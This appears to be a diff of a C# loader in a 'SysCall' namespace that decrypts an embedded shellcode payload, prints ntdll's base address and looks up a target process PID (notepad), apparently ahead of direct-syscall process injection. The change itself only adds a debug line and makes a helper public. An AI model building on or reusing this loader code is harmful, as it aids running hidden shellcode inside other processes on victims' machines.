@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
@@ -22,7 +22,10 @@ namespace SysCall
 
             // decrypt the payload
             byte[] shellcode = Decrypt(key, payload);
-           
+
+            // display the base address of ntdll.dll
+            Debug("[+] Base Address of ntdll is 0x{0}", new string[] { Syscalls.NtDllBaseAddress.ToString("X") });
+
             // get the pid of the explorer process
             int pid = System.Diagnostics.Process.GetProcessesByName("notepad")[0].Id;
             Debug("[+] Target PID is {0}", new string[] { pid.ToString() });
@@ -130,7 +133,7 @@ namespace SysCall
             return b;
         }
 
-        private static void Debug(string text, string[] args)
+        public static void Debug(string text, string[] args)
         {
             #if DEBUG
             Console.WriteLine(text, args);
